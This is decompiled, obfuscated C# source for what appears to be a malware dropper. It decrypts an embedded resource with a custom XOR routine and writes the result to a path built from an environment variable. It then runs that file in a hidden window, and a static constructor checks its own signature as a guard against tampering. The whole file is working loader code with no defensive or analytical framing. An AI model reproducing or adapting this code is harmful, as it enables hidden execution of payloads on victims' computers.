using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsWithoutUI;
using SmartAssembly.StringsEncoding;

namespace ns0;

[StandardModule]
internal sealed class Class2
{
	public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		checked
		{
			int i = default(int);
			try
			{
				for (i = byte_0.Length * 2 + byte_1.Length; i >= 0; i += -1)
				{
					byte_0[unchecked(i % byte_0.Length)] = (byte)unchecked(checked(unchecked(byte_0[i % byte_0.Length] ^ byte_1[i % byte_1.Length]) - unchecked((int)byte_0[checked(i + 1) % byte_0.Length]) + 256) % 256);
				}
				return byte_0;
			}
			catch (Exception exception)
			{
				byte[] o = default(byte[]);
				StackFrameHelper.CreateException4(exception, o, i, byte_0, byte_1);
				throw;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		string text = default(string);
		byte[] bytes = default(byte[]);
		ResourceManager resourceManager = default(ResourceManager);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		Process process = default(Process);
		try
		{
			if (UnhandledExceptionHandlerWithoutUI.AttachApp())
			{
				text = Environment.GetEnvironmentVariable(Strings.Get(207)) + Strings.Get(216);
				bytes = Encoding.UTF8.GetBytes(Strings.Get(253));
				resourceManager = new ResourceManager(Strings.Get(599), Assembly.GetExecutingAssembly());
				array = (byte[])resourceManager.GetObject(Strings.Get(604));
				array2 = smethod_0(array, bytes);
				File.WriteAllBytes(text, array2);
				process = new Process();
				process.StartInfo.FileName = text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch (Exception exception)
		{
			UnhandledExceptionHandler.EntryPointException(exception, new object[6] { bytes, array2, process, array, resourceManager, text });
		}
	}

	static Class2()
	{
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if (!StrongNameSignatureVerificationEx(executingAssembly.Location, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith(Strings.Get(609)))
		{
			throw new SecurityException(Strings.Get(634));
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);
}
